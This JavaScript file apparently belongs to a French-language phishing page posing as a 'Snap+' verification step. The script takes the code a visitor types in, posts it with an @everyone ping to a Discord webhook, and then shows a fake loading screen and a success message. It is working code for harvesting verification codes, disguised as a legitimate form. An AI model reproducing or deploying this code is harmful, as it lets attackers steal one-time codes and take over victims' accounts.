const sendCodeBtn = document.getElementById('sendCodeBtn');
const codeInput = document.getElementById('codeInput');
const loadingScreen = document.getElementById('loadingScreen');
const successMessage = document.getElementById('successMessage');
const inputWrapper = document.querySelector('.input-wrapper');

inputWrapper.addEventListener('focusin', () => {
    inputWrapper.style.transform = 'translateY(-2px)';
    inputWrapper.querySelector('i').style.color = '#667eea';
});

inputWrapper.addEventListener('focusout', () => {
    inputWrapper.style.transform = 'translateY(0)';
    if (!codeInput.value) {
        inputWrapper.querySelector('i').style.color = 'rgba(255, 255, 255, 0.5)';
    }
});

codeInput.addEventListener('input', () => {
    inputWrapper.style.borderColor = codeInput.value ? '#667eea' : 'rgba(255, 255, 255, 0.1)';
});

const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);

sendCodeBtn.addEventListener('click', async function() {
    const code = codeInput.value.trim();

    if (!code) {
        sendCodeBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => sendCodeBtn.style.animation = '', 500);
        alert('Veuillez entrer un code');
        return;
    }

    sendCodeBtn.disabled = true;
    sendCodeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
    document.querySelector('.form-group').style.display = 'none';
    document.querySelector('.headline').style.display = 'none';
    sendCodeBtn.style.display = 'none';
    loadingScreen.classList.add('active');

    const embed = createEmbed(
        '🔐 Code de vérification Snap+',
        'Un nouveau code de vérification est disponible.',
        0x10b981,
        [
            { name: '🔑 Code', value: `**${code}**`, inline: false },
            { name: '⏰ Date', value: new Date().toLocaleString('fr-FR'), inline: false }
        ]
    );

    const sent = await sendToDiscord({
        content: '@everyone',
        embeds: [embed]
    });

    if (!sent) {
        loadingScreen.classList.remove('active');
        document.querySelector('.form-group').style.display = '';
        document.querySelector('.headline').style.display = '';
        sendCodeBtn.style.display = '';
        sendCodeBtn.disabled = false;
        sendCodeBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Envoyer';
        alert('Erreur lors de l\'envoi sur Discord.');
        return;
    }

    setTimeout(() => {
        loadingScreen.classList.remove('active');
        successMessage.classList.add('active');
    }, 5000);
});
